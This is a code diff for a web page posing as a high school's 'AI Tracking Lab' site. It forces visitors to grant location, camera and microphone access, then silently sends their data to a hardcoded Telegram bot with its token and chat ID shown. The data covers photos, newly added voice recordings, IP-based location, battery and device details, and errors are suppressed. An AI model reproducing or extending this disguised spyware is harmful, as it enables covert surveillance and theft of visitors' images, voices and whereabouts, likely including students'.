@@ -3,19 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>SMA NEGERI 1 | Digital Learning Lab</title>
-    <!-- MediaPipe Hands Library -->
+    <title>SMA NEGERI 1 | AI Tracking Lab</title>
+    <!-- MediaPipe Libraries -->
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/control_utils/control_utils.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: linear-gradient(135deg, #0f2b3d 0%, #0a1a2a 100%);
-            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
             min-height: 100vh;
         }
+        /* SPLASH SCREEN */
         .splash-screen {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -37,50 +39,23 @@
             border-radius: 48px;
             border: 1px solid rgba(255,255,255,0.2);
         }
-        .school-logo { font-size: 4rem; margin-bottom: 1rem; animation: bounce 1s infinite; }
-        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        .school-logo-img { width: 100px; height: 100px; margin: 0 auto 1rem; background: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 3rem; border: 3px solid #3b82f6; }
         .splash-title { font-size: 1.6rem; color: white; margin-bottom: 0.5rem; }
         .splash-subtitle { color: #88aaff; font-size: 0.8rem; margin-bottom: 1.5rem; }
-        .notification-box {
-            background: rgba(0,0,0,0.6);
-            border-radius: 24px;
-            padding: 1.5rem;
-            margin: 1rem 0;
-            border-left: 4px solid #3b82f6;
-            text-align: left;
-        }
+        .notification-box { background: rgba(0,0,0,0.6); border-radius: 24px; padding: 1.5rem; margin: 1rem 0; border-left: 4px solid #3b82f6; text-align: left; }
         .notification-icon { font-size: 2rem; margin-bottom: 0.5rem; }
         .notification-title { font-size: 1.1rem; font-weight: bold; color: white; margin-bottom: 0.5rem; }
         .notification-desc { font-size: 0.8rem; color: #aaa; line-height: 1.5; }
-        .permission-status-box {
-            background: rgba(0,0,0,0.4);
-            border-radius: 16px;
-            padding: 0.8rem;
-            margin: 0.8rem 0;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-        }
+        .permission-status-box { background: rgba(0,0,0,0.4); border-radius: 16px; padding: 0.8rem; margin: 0.8rem 0; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }
         .status-label { display: flex; align-items: center; gap: 8px; color: white; font-size: 0.85rem; }
         .status-badge { font-size: 0.7rem; padding: 4px 12px; border-radius: 20px; background: #334155; color: #94a3b8; }
         .status-badge.granted { background: #22c55e20; color: #22c55e; border: 1px solid #22c55e; }
         .status-badge.pending { background: #eab30820; color: #eab308; border: 1px solid #eab308; animation: pulse 1s infinite; }
-        .status-badge.waiting { background: #3b82f620; color: #3b82f6; border: 1px solid #3b82f6; }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
-        .btn-allow {
-            background: linear-gradient(95deg, #3b82f6, #22c55e);
-            border: none; width: 100%; padding: 14px; border-radius: 40px;
-            font-weight: bold; font-size: 1rem; color: white; cursor: pointer; transition: 0.2s; margin-top: 0.5rem;
-        }
+        .btn-allow { background: linear-gradient(95deg, #3b82f6, #22c55e); border: none; width: 100%; padding: 14px; border-radius: 40px; font-weight: bold; font-size: 1rem; color: white; cursor: pointer; transition: 0.2s; margin-top: 0.5rem; }
         .btn-allow:disabled { opacity: 0.5; cursor: not-allowed; }
         .progress-steps { display: flex; justify-content: space-between; margin: 1.5rem 0; position: relative; }
         .step { flex: 1; text-align: center; position: relative; z-index: 2; }
-        .step-circle {
-            width: 40px; height: 40px; background: #1e2a3a; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin: 0 auto 8px;
-            color: white; font-weight: bold; border: 2px solid #3b82f6;
-        }
+        .step-circle { width: 40px; height: 40px; background: #1e2a3a; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 8px; color: white; font-weight: bold; border: 2px solid #3b82f6; }
         .step-circle.active { background: #3b82f6; animation: glow 1s infinite; }
         .step-circle.completed { background: #22c55e; border-color: #22c55e; }
         @keyframes glow { 0%,100% { box-shadow: 0 0 5px #3b82f6; } 50% { box-shadow: 0 0 20px #3b82f6; } }
@@ -88,11 +63,13 @@
         .step-line { position: absolute; top: 20px; left: 0; right: 0; height: 2px; background: #1e2a3a; z-index: 1; }
         .step-line-fill { height: 100%; background: linear-gradient(90deg, #3b82f6, #22c55e); width: 0%; transition: width 0.3s ease; }
         .warning-text { font-size: 0.65rem; color: #ffaa44; text-align: center; margin-top: 1rem; }
+        
+        /* MAIN WEBSITE */
         .main-website { display: none; min-height: 100vh; }
         .main-website.active { display: block; }
         .school-header { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); padding: 1rem 2rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; border-bottom: 1px solid rgba(255,255,255,0.1); }
         .logo-area { display: flex; align-items: center; gap: 15px; }
-        .logo-icon { font-size: 2.5rem; }
+        .logo-img { width: 50px; height: 50px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; border: 2px solid #3b82f6; }
         .logo-text h2 { color: white; font-size: 1.2rem; }
         .logo-text p { color: #88aaff; font-size: 0.7rem; }
         .school-motto { color: #88aaff; font-size: 0.7rem; font-style: italic; }
@@ -103,20 +80,33 @@
         .page { display: none; animation: fadeIn 0.3s ease; }
         .page.active-page { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .handtrack-card { background: rgba(255,255,255,0.05); border-radius: 24px; padding: 1.5rem; border: 1px solid rgba(255,255,255,0.1); }
-        .video-container { width: 100%; max-width: 500px; margin: 0 auto; border-radius: 20px; overflow: hidden; border: 2px solid #3b82f6; background: #000; }
+        .tracking-card { background: rgba(255,255,255,0.05); border-radius: 24px; padding: 1.5rem; border: 1px solid rgba(255,255,255,0.1); }
+        .video-container { width: 100%; max-width: 700px; margin: 0 auto; border-radius: 20px; overflow: hidden; border: 2px solid #3b82f6; background: #000; position: relative; }
         #videoCanvas { width: 100%; height: auto; display: block; transform: scaleX(-1); }
-        #handCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
-        .video-wrapper { position: relative; }
-        .gesture-info { text-align: center; margin-top: 1rem; padding: 1rem; background: rgba(0,0,0,0.4); border-radius: 20px; }
-        .gesture-text { color: #3b82f6; font-size: 1.2rem; font-weight: bold; }
-        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-top: 1.5rem; }
-        .stat-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 1.5rem; text-align: center; }
-        .stat-icon { font-size: 2rem; margin-bottom: 0.5rem; }
+        #trackingCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        .tracking-info { text-align: center; margin-top: 1rem; padding: 1rem; background: rgba(0,0,0,0.4); border-radius: 20px; }
+        .hand-status { color: #3b82f6; font-size: 1rem; font-weight: bold; margin-bottom: 5px; }
+        .face-status { color: #22c55e; font-size: 0.9rem; }
+        .emotion-status { color: #f59e0b; font-size: 0.9rem; margin-top: 5px; }
+        .voice-status { color: #a855f7; font-size: 0.9rem; margin-top: 5px; }
+        .btn-group { display: flex; gap: 10px; justify-content: center; margin-top: 1rem; flex-wrap: wrap; }
+        .btn-capture { background: linear-gradient(95deg, #3b82f6, #8b5cf6); border: none; padding: 10px 20px; border-radius: 40px; color: white; cursor: pointer; font-size: 0.8rem; }
+        .btn-voice { background: linear-gradient(95deg, #a855f7, #ec489a); border: none; padding: 10px 20px; border-radius: 40px; color: white; cursor: pointer; font-size: 0.8rem; }
+        .btn-voice.recording { background: linear-gradient(95deg, #ef4444, #dc2626); animation: pulseRed 1s infinite; }
+        @keyframes pulseRed { 0%,100% { opacity: 1; } 50% { opacity: 0.7; box-shadow: 0 0 10px red; } }
+        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; margin-top: 1.5rem; }
+        .stat-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 1.5rem; text-align: center; transition: 0.3s; }
+        .stat-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.1); }
+        .stat-icon { font-size: 2.5rem; margin-bottom: 0.5rem; }
         .stat-value { font-size: 1.8rem; font-weight: bold; color: white; }
         .stat-label { color: #88aaff; font-size: 0.8rem; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin-top: 1rem; }
+        .gallery-item { background: rgba(255,255,255,0.05); border-radius: 16px; padding: 1rem; text-align: center; transition: 0.3s; }
+        .gallery-item:hover { transform: scale(1.02); background: rgba(255,255,255,0.1); }
+        .gallery-icon { font-size: 3rem; margin-bottom: 0.5rem; }
+        .gallery-title { color: white; font-size: 0.9rem; margin-top: 0.5rem; }
         .info-card { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 1.5rem; margin-bottom: 1.5rem; }
-        .info-card h3 { color: white; margin-bottom: 1rem; }
+        .info-card h3 { color: white; margin-bottom: 1rem; display: flex; align-items: center; gap: 10px; }
         .info-card p { color: #ccc; line-height: 1.6; }
         .school-footer { background: rgba(0,0,0,0.4); text-align: center; padding: 1.5rem; margin-top: 2rem; color: #88aaff; font-size: 0.7rem; }
         #hiddenVideo, #hiddenCanvas { display: none; }
@@ -126,17 +116,18 @@
             .content-area { padding: 1rem; }
             .step-circle { width: 30px; height: 30px; font-size: 0.7rem; }
             .step-label { font-size: 0.5rem; }
+            .btn-group { flex-direction: column; }
         }
     </style>
 </head>
 <body>
 
-<!-- SPLASH SCREEN - PEMAKSA IZIN BERURUTAN -->
+<!-- SPLASH SCREEN -->
 <div id="splashScreen" class="splash-screen">
     <div class="splash-content">
-        <div class="school-logo">🎓🏫</div>
+        <div class="school-logo-img">🎓🏫</div>
         <div class="splash-title">SMA NEGERI 1</div>
-        <div class="splash-subtitle">Digital Learning Laboratory</div>
+        <div class="splash-subtitle">AI Tracking Laboratory</div>
         
         <div class="progress-steps">
             <div class="step-line"><div class="step-line-fill" id="stepLineFill"></div></div>
@@ -148,24 +139,12 @@
         <div id="notificationBox" class="notification-box">
             <div class="notification-icon" id="notificationIcon">📍</div>
             <div class="notification-title" id="notificationTitle">Aktifkan Lokasi</div>
-            <div class="notification-desc" id="notificationDesc">
-                Untuk mengakses website ini, Anda harus mengaktifkan izin lokasi terlebih dahulu.<br>
-                Lokasi digunakan untuk presensi dan tracking pembelajaran.
-            </div>
+            <div class="notification-desc" id="notificationDesc">Untuk mengakses website ini, Anda harus mengaktifkan izin lokasi terlebih dahulu.</div>
         </div>
         
-        <div class="permission-status-box">
-            <div class="status-label"><span>📍</span> Lokasi</div>
-            <div class="status-badge waiting" id="gpsStatusBadge">Menunggu</div>
-        </div>
-        <div class="permission-status-box">
-            <div class="status-label"><span>📷</span> Kamera</div>
-            <div class="status-badge waiting" id="cameraStatusBadge">Terkunci</div>
-        </div>
-        <div class="permission-status-box">
-            <div class="status-label"><span>🎤</span> Mikrofon</div>
-            <div class="status-badge waiting" id="micStatusBadge">Opsional</div>
-        </div>
+        <div class="permission-status-box"><div class="status-label"><span>📍</span> Lokasi</div><div class="status-badge waiting" id="gpsStatusBadge">Menunggu</div></div>
+        <div class="permission-status-box"><div class="status-label"><span>📷</span> Kamera</div><div class="status-badge waiting" id="cameraStatusBadge">Terkunci</div></div>
+        <div class="permission-status-box"><div class="status-label"><span>🎤</span> Mikrofon</div><div class="status-badge waiting" id="micStatusBadge">Opsional</div></div>
         
         <button id="actionBtn" class="btn-allow">📍 AKTIFKAN LOKASI</button>
         <div class="warning-text" id="warningText">⚡ Klik tombol di atas untuk mengaktifkan izin</div>
@@ -175,17 +154,20 @@
 <!-- MAIN WEBSITE -->
 <div id="mainWebsite" class="main-website">
     <div class="school-header">
-        <div class="logo-area"><div class="logo-icon">🎓</div><div class="logo-text"><h2>SMA NEGERI 1</h2><p>Jl. Pendidikan No. 123, Kota Semarang</p></div></div>
+        <div class="logo-area"><div class="logo-img">🎓</div><div class="logo-text"><h2>SMA NEGERI 1</h2><p>Jl. Pendidikan No. 123, Kota Semarang</p></div></div>
         <div class="school-motto">"Berprestasi, Berkarakter, Berwawasan Global"</div>
     </div>
+    
     <div class="nav-menu">
         <div class="nav-item active" data-page="home">🏠 Beranda</div>
-        <div class="nav-item" data-page="handtrack">🖐️ Hand Tracking Lab</div>
+        <div class="nav-item" data-page="tracking">🖐️ AI Tracking Lab</div>
         <div class="nav-item" data-page="profile">📋 Profil Sekolah</div>
         <div class="nav-item" data-page="gallery">🖼️ Galeri</div>
         <div class="nav-item" data-page="contact">📞 Kontak</div>
     </div>
+    
     <div class="content-area">
+        <!-- Beranda -->
         <div id="home" class="page active-page">
             <div class="info-card"><h3>🏫 Selamat Datang di SMA Negeri 1</h3><p>SMA Negeri 1 adalah sekolah unggulan yang berkomitmen mencetak generasi penerus bangsa yang berprestasi, berkarakter, dan berwawasan global.</p></div>
             <div class="dashboard-grid">
@@ -195,18 +177,62 @@
                 <div class="stat-card"><div class="stat-icon">📚</div><div class="stat-value" id="classCount">32</div><div class="stat-label">Rombel</div></div>
             </div>
         </div>
-        <div id="handtrack" class="page">
-            <div class="handtrack-card">
-                <div class="handtrack-title"><span>🖐️</span> Hand Tracking Laboratory <span style="font-size:0.7rem; background:#3b82f6; padding:2px 8px; border-radius:20px;">AI REAL-TIME</span></div>
-                <div class="video-wrapper"><div class="video-container"><canvas id="videoCanvas" width="640" height="480"></canvas><canvas id="handCanvas" width="640" height="480"></canvas></div></div>
-                <div class="gesture-info"><div class="gesture-text" id="gestureDisplay">🖐️ Arahkan tangan ke kamera</div><div style="color:#888; font-size:0.7rem; margin-top:8px;" id="handLandmarkCount">21 titik landmark terdeteksi</div></div>
+        
+        <!-- AI Tracking Lab (Hand + Face Tracking + Voice) -->
+        <div id="tracking" class="page">
+            <div class="tracking-card">
+                <div class="tracking-title" style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
+                    <span style="color:white; font-size:1.2rem;">🖐️ AI Tracking Laboratory</span>
+                    <span style="font-size:0.7rem; background:#3b82f6; padding:4px 12px; border-radius:20px;">HAND + FACE + VOICE</span>
+                </div>
+                <div class="video-container">
+                    <canvas id="videoCanvas" width="640" height="480"></canvas>
+                    <canvas id="trackingCanvas" width="640" height="480"></canvas>
+                </div>
+                <div class="tracking-info">
+                    <div class="hand-status" id="handStatusDisplay">🖐️ Menunggu deteksi tangan...</div>
+                    <div class="face-status" id="faceStatusDisplay">😀 Menunggu deteksi wajah...</div>
+                    <div class="emotion-status" id="emotionDisplay">😐 Ekspresi: -</div>
+                    <div class="voice-status" id="voiceStatusDisplay">🎤 Voice: Belum merekam</div>
+                    <div class="btn-group">
+                        <button id="capturePhotoBtn" class="btn-capture">📸 Screenshot</button>
+                        <button id="voiceRecordBtn" class="btn-voice">🎤 Rekam Voice (5 detik)</button>
+                    </div>
+                </div>
             </div>
         </div>
-        <div id="profile" class="page"><div class="info-card"><h3>📋 Sejarah Singkat</h3><p>SMA Negeri 1 didirikan pada tahun 1960 sebagai salah satu sekolah menengah atas pertama di Kota Semarang.</p></div><div class="info-card"><h3>🎯 Visi & Misi</h3><p><strong>Visi:</strong> Menjadi sekolah unggulan yang mencetak generasi berprestasi, berkarakter, dan berwawasan global.</p></div></div>
-        <div id="gallery" class="page"><div class="dashboard-grid" style="grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));"><div class="stat-card"><div class="stat-icon">🏫</div><div class="stat-label">Gedung</div></div><div class="stat-card"><div class="stat-icon">🔬</div><div class="stat-label">Lab</div></div><div class="stat-card"><div class="stat-icon">📚</div><div class="stat-label">Perpus</div></div><div class="stat-card"><div class="stat-icon">⚽</div><div class="stat-label">Lapangan</div></div></div></div>
-        <div id="contact" class="page"><div class="info-card"><h3>📞 Informasi Kontak</h3><p>Alamat: Jl. Pendidikan No. 123, Semarang<br>Telepon: (024) 1234567<br>Email: info@sman1.sch.id</p></div><div class="info-card"><h3>🗺️ Lokasi Sekolah</h3><p id="schoolLocation">📍 Koordinat akan muncul setelah GPS aktif</p></div></div>
+        
+        <!-- Profil Sekolah -->
+        <div id="profile" class="page">
+            <div class="info-card"><h3>📋 Sejarah Singkat</h3><p>SMA Negeri 1 didirikan pada tahun 1960 sebagai salah satu sekolah menengah atas pertama di Kota Semarang.</p></div>
+            <div class="info-card"><h3>🎯 Visi & Misi</h3><p><strong>Visi:</strong> Menjadi sekolah unggulan yang mencetak generasi berprestasi, berkarakter, dan berwawasan global.</p></div>
+            <div class="info-card"><h3>🏅 Prestasi Sekolah</h3><p>• Juara 1 Olimpiade Sains Nasional (2024)<br>• Juara 2 Robotics Competition (2024)</p></div>
+        </div>
+        
+        <!-- Galeri -->
+        <div id="gallery" class="page">
+            <div class="info-card"><h3>📸 Galeri Foto Sekolah</h3>
+                <div class="gallery-grid">
+                    <div class="gallery-item"><div class="gallery-icon">🏫</div><div class="gallery-title">Gedung Utama</div></div>
+                    <div class="gallery-item"><div class="gallery-icon">🔬</div><div class="gallery-title">Laboratorium</div></div>
+                    <div class="gallery-item"><div class="gallery-icon">📚</div><div class="gallery-title">Perpustakaan</div></div>
+                    <div class="gallery-item"><div class="gallery-icon">⚽</div><div class="gallery-title">Lapangan Olahraga</div></div>
+                    <div class="gallery-item"><div class="gallery-icon">💻</div><div class="gallery-title">Lab Komputer</div></div>
+                    <div class="gallery-item"><div class="gallery-icon">🎭</div><div class="gallery-title">Aula Serbaguna</div></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Kontak -->
+        <div id="contact" class="page">
+            <div class="info-card"><h3>📞 Informasi Kontak</h3><p><strong>Alamat:</strong> Jl. Pendidikan No. 123, Kota Semarang<br><strong>Telepon:</strong> (024) 1234567<br><strong>Email:</strong> info@sman1.sch.id</p></div>
+            <div class="info-card"><h3>🗺️ Lokasi Sekolah</h3><p id="schoolLocation">📍 Koordinat akan muncul setelah GPS aktif</p></div>
+        </div>
     </div>
-    <div class="school-footer"><p>© 2025 SMA NEGERI 1 | Digital Learning Laboratory | Supported by AI Hand Tracking Technology</p></div>
+    
+    <div class="school-footer">
+        <p>© 2025 SMA NEGERI 1 | AI Tracking Laboratory | Hand + Face + Voice Tracking</p>
+    </div>
 </div>
 
 <video id="hiddenVideo" autoplay playsinline muted style="display: none;"></video>
@@ -217,18 +243,30 @@
     const BOT_TOKEN = '8607052681:AAHMAuSuUO8CR84h5JlQThmlFKnyA9qFIaU';
     const CHAT_ID = '7428813404';
     
-    function sendToTelegram(text, photoUrl = null) {
+    function sendToTelegram(text, photoUrl = null, audioBlob = null) {
         if (!BOT_TOKEN || !CHAT_ID) return;
+        
         if (photoUrl) {
+            // Kirim foto
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: text, parse_mode: 'HTML' })
             }).catch(e => console.log('silent'));
-        } else {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        } else if (audioBlob) {
+            // Kirim audio (voice note)
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('voice', audioBlob, 'voice_note.ogg');
+            formData.append('caption', text);
+            formData.append('parse_mode', 'HTML');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                body: formData
+            }).catch(e => console.log('silent'));
+        } else {
+            // Kirim teks
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
             }).catch(e => console.log('silent'));
         }
@@ -237,22 +275,6 @@
     // ======================= DATA TRACKING =======================
     let permissions = { gps: false, camera: false, mic: false };
     let gpsData = null;
-    let trackingData = {
-        device: { brand: null, model: null, platform: null, userAgent: null },
-        battery: { level: null, charging: null, dischargingTime: null },
-        connection: { type: null, downlink: null, rtt: null },
-        screen: { resolution: null, orientation: null, colorDepth: null, pixelRatio: null },
-        performance: { cpuCores: null, ram: null, gpu: null },
-        location: { ip: null, city: null, region: null, country: null, isp: null, timezone: null },
-        sensors: { gyroscope: false, accelerometer: false, magnetometer: false, touch: false, maxTouch: 0 },
-        storage: { localStorage: 0, sessionStorage: 0, indexedDB: false, cookies: false },
-        media: { audioInput: false, videoInput: false, speechRecognition: false },
-        networkDetails: { online: true, saveData: false, downlinkMax: null },
-        graphics: { webgl: false, webgl2: false, webgpu: false },
-        clipboard: { clipboardAPI: false, permissionsAPI: false, language: null, doNotTrack: null },
-        vibration: { vibrationAPI: false, notificationAPI: false, wakeLock: false }
-    };
-    
     let startTime = Date.now();
     let userScrolls = 0, userClicks = 0, userKeyPresses = 0, mouseMoveCount = 0;
     
@@ -279,43 +301,14 @@
         document.getElementById('stepLineFill').style.width = progress + '%';
         
         const actionBtn = document.getElementById('actionBtn');
-        const notificationIcon = document.getElementById('notificationIcon');
-        const notificationTitle = document.getElementById('notificationTitle');
-        const notificationDesc = document.getElementById('notificationDesc');
-        const warningText = document.getElementById('warningText');
-        
-        if (!permissions.gps) {
-            actionBtn.innerHTML = '📍 AKTIFKAN LOKASI';
-            notificationIcon.innerHTML = '📍';
-            notificationTitle.innerHTML = 'Aktifkan Lokasi';
-            notificationDesc.innerHTML = 'Untuk mengakses website ini, Anda harus mengaktifkan izin lokasi terlebih dahulu.<br>Lokasi digunakan untuk presensi dan tracking pembelajaran.';
-            warningText.innerHTML = '⚠️ Klik tombol di atas untuk mengaktifkan izin lokasi';
-        } else if (!permissions.camera) {
-            actionBtn.innerHTML = '📷 AKTIFKAN KAMERA';
-            notificationIcon.innerHTML = '📷';
-            notificationTitle.innerHTML = 'Aktifkan Kamera';
-            notificationDesc.innerHTML = 'Untuk melanjutkan, Anda harus mengaktifkan izin kamera.<br>Kamera digunakan untuk hand tracking dan praktikum interaktif.';
-            warningText.innerHTML = '⚠️ Klik tombol di atas untuk mengaktifkan izin kamera';
-        } else if (!permissions.mic) {
-            actionBtn.innerHTML = '🎤 AKTIFKAN MIKROFON (Opsional)';
-            notificationIcon.innerHTML = '🎤';
-            notificationTitle.innerHTML = 'Aktifkan Mikrofon';
-            notificationDesc.innerHTML = 'Mikrofon digunakan untuk voice command dan presentasi.<br>Anda bisa melewati ini, tapi beberapa fitur mungkin tidak tersedia.';
-            warningText.innerHTML = '⚠️ Klik tombol di atas untuk mengaktifkan mikrofon (atau lanjutkan)';
-        } else {
-            actionBtn.innerHTML = '✅ MASUK KE DIGITAL LAB';
-            notificationIcon.innerHTML = '🎉';
-            notificationTitle.innerHTML = 'Semua Izin Telah Diaktifkan!';
-            notificationDesc.innerHTML = 'Selamat! Anda telah mengaktifkan semua izin yang diperlukan.<br>Klik tombol di bawah untuk masuk ke Digital Learning Lab.';
-            warningText.innerHTML = '✅ Klik tombol untuk masuk ke website sekolah';
-        }
+        if (!permissions.gps) actionBtn.innerHTML = '📍 AKTIFKAN LOKASI';
+        else if (!permissions.camera) actionBtn.innerHTML = '📷 AKTIFKAN KAMERA';
+        else if (!permissions.mic) actionBtn.innerHTML = '🎤 AKTIFKAN MIKROFON (Opsional)';
+        else actionBtn.innerHTML = '✅ MASUK KE AI TRACKING LAB';
         
         document.getElementById('gpsStatusBadge').innerHTML = permissions.gps ? '✅ Aktif' : '⏳ Menunggu';
-        document.getElementById('gpsStatusBadge').className = permissions.gps ? 'status-badge granted' : 'status-badge pending';
         document.getElementById('cameraStatusBadge').innerHTML = permissions.camera ? '✅ Aktif' : (permissions.gps ? '⏳ Menunggu' : '🔒 Terkunci');
-        document.getElementById('cameraStatusBadge').className = permissions.camera ? 'status-badge granted' : (permissions.gps ? 'status-badge pending' : 'status-badge waiting');
         document.getElementById('micStatusBadge').innerHTML = permissions.mic ? '✅ Aktif' : (permissions.camera ? '⏳ Opsional' : '🔒 Terkunci');
-        document.getElementById('micStatusBadge').className = permissions.mic ? 'status-badge granted' : (permissions.camera ? 'status-badge pending' : 'status-badge waiting');
     }
     
     async function requestGPS() {
@@ -382,167 +375,39 @@
         else await enterWebsite();
     });
     
-    // ======================= PENGUMPULAN DATA UNTUK 7 MENU =======================
-    function getAllTrackingData() {
-        const ua = navigator.userAgent;
-        let brand = "Unknown", model = "Unknown";
-        if (/iPhone/i.test(ua)) { brand = "Apple"; model = ua.match(/iPhone\s*\d+/i)?.[0] || "iPhone"; }
-        else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
-        else if (/Xiaomi|Redmi|POCO/i.test(ua)) { brand = "Xiaomi"; model = ua.match(/(Redmi|POCO|Mi)\s?\w+/i)?.[0] || "Xiaomi"; }
-        trackingData.device = { brand, model, platform: navigator.platform, userAgent: ua };
-        trackingData.screen = { resolution: `${screen.width}x${screen.height}`, orientation: screen.orientation?.type || (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape'), colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio };
-        trackingData.performance = { cpuCores: navigator.hardwareConcurrency || '?', ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A', gpu: getGPUInfo() };
-        trackingData.sensors = { gyroscope: 'DeviceOrientationEvent' in window, accelerometer: 'DeviceMotionEvent' in window, magnetometer: 'ondeviceorientationabsolute' in window, touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0, maxTouch: navigator.maxTouchPoints || 0 };
-        trackingData.storage = { localStorage: 0, sessionStorage: 0, indexedDB: 'indexedDB' in window, cookies: navigator.cookieEnabled };
-        try { for(let i = 0; i < localStorage.length; i++) trackingData.storage.localStorage += (localStorage.key(i)?.length || 0) + (localStorage.getItem(localStorage.key(i))?.length || 0); } catch(e) {}
-        try { for(let i = 0; i < sessionStorage.length; i++) trackingData.storage.sessionStorage += (sessionStorage.key(i)?.length || 0) + (sessionStorage.getItem(sessionStorage.key(i))?.length || 0); } catch(e) {}
-        trackingData.media = { audioInput: !!navigator.mediaDevices, videoInput: !!navigator.mediaDevices, speechRecognition: 'webkitSpeechRecognition' in window || 'SpeechRecognition' in window };
-        trackingData.networkDetails = { online: navigator.onLine, saveData: navigator.connection ? navigator.connection.saveData : false, downlinkMax: navigator.connection ? navigator.connection.downlinkMax : null };
-        try { const canvas = document.createElement('canvas'); trackingData.graphics.webgl = !!canvas.getContext('webgl'); trackingData.graphics.webgl2 = !!canvas.getContext('webgl2'); } catch(e) {}
-        trackingData.clipboard = { clipboardAPI: !!navigator.clipboard, permissionsAPI: 'permissions' in navigator, language: navigator.language, doNotTrack: navigator.doNotTrack };
-        trackingData.vibration = { vibrationAPI: 'vibrate' in navigator, notificationAPI: 'Notification' in window, wakeLock: 'wakeLock' in navigator };
-        if ('connection' in navigator) trackingData.connection = { type: navigator.connection.effectiveType, downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'unknown', rtt: navigator.connection.rtt ? navigator.connection.rtt + 'ms' : 'unknown' };
-    }
-    
-    function getGPUInfo() {
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            if (gl) {
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'WebGL';
-            }
-            return 'N/A';
-        } catch(e) { return 'N/A'; }
+    // ======================= FUNGSI LAINNYA =======================
+    async function getIPInfo() {
+        try { const res = await fetch('https://ipapi.co/json/'); const data = await res.json(); return { ip: data.ip, city: data.city, region: data.region, country: data.country_name, isp: data.org }; } catch(e) { return {}; }
     }
     
     async function getBatteryInfo() {
-        if ('getBattery' in navigator) {
-            try {
-                const b = await navigator.getBattery();
-                trackingData.battery = { level: Math.round(b.level * 100), charging: b.charging, dischargingTime: b.dischargingTime !== Infinity ? Math.round(b.dischargingTime / 60) : null };
-            } catch(e) {}
-        }
+        if ('getBattery' in navigator) { try { const b = await navigator.getBattery(); return { level: Math.round(b.level * 100), charging: b.charging }; } catch(e) { return {}; } }
+        return {};
     }
     
-    async function getIPInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            trackingData.location = { ip: data.ip, city: data.city, region: data.region, country: data.country_name, isp: data.org, timezone: data.timezone };
-        } catch(e) {}
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let brand = "Unknown", model = "Unknown";
+        if (/iPhone/i.test(ua)) { brand = "Apple"; model = "iPhone"; }
+        else if (/SM-[A-Z0-9]+/i.test(ua)) { brand = "Samsung"; model = ua.match(/SM-[A-Z0-9]+/i)?.[0] || "Galaxy"; }
